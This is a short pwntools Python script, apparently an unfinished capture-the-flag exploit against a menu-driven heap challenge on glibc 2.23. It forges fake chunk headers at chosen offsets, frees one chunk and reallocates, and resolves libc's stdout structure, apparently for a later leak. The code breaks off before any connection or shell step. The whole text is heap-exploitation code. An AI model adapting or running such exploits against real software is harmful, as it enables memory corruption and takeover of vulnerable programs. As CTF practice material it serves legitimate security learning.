from pwn import *
#context(arch = 'amd64',os = 'linux',log_level = 'debug') 
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
_IO_2_1_stdout_s = libc.sym['_IO_2_1_stdout_']
    
def add(size):
    io.sendlineafter('>>','1')
    io.sendlineafter('size:',str(size))
    
def edit(offset,size,content):
    io.sendlineafter('>>','2')
    io.sendlineafter('offset:',str(offset))
    io.sendlineafter('size:',str(size))
    io.sendafter('content:',content)
    
    
def delete(offset):
    io.sendlineafter('>>','3')
    io.sendlineafter('offset:',str(offset))
    
def exploit():
    edit(0,0x100,p64(0) + p64(0x421) + 'a'*0xF0)
    edit(0x420,0x20,p64(0) + p64(0x21) + 'b'*0x10)
    edit(0x440,0x20,p64(0) + p64(0x21) + 'b'*0x10)
    edit(0x880,0x100,p64(0) + p64(0x431) + 'c'*0xF0)
    edit(0xCB0,0x20,p64(0) + p64(0x21) + 'd'*0x10)
    edit(0xCD0,0x90,p64(0) + p64(0x91) + 'e'*0x80)
    edit(0xD60,0x20,p64(0) + p64(0x21) + 'f'*0x10)
    edit(0xD80,0x20,p64(0) + p64(0x21) + 'g'*0x10)
    
    delete(0x10)
    add(0x430)
